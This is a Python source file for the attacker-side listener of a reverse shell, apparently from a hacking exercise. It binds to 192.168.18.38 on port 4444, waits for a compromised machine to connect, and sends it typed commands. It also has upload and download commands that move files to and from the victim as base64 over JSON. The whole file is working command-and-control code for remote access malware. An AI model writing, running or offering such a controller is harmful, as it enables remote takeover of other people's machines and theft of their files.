import socket,json
import base64
class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0) # 0 is the backlog: Number of connections that can be queued before the system starts refusing connections
        print("[+] Listening for incoming connections")
        self.connection, address = listener.accept() # Blocks till a connection comes
        print("[+] Got a connection" + str(address))

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode()) # Encode converts string into bytes

    def reliable_receive(self):
        json_data = b"" # Byte object
        while(True):
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data) # Convert to json
            except ValueError:
                continue # Need to receive more data

    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.reliable_receive()

    def read_file(self, path): # For downloading files
        with open(path,"rb") as file: # b for read as binary
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def run(self):
        while True:
            try:
                command = input(">> ")
                command = command.split(" ") # Convert to a list
                if command[0] == 'upload':
                    file_content = self.read_file(command[1]).decode()
                    command.append(file_content)
                result = self.execute_remotely(command)
                #result = self.connection.recv(1024) # Buffer size
                if command[0] == "download" and "[-] Error " not in result: #Write into file instead of printing
                    result = self.write_file(command[1], result)

            except Exception:
                result = "[-] Error occurred during execution"
            print(result)
my_listener = Listener("192.168.18.38", 4444)
my_listener.run()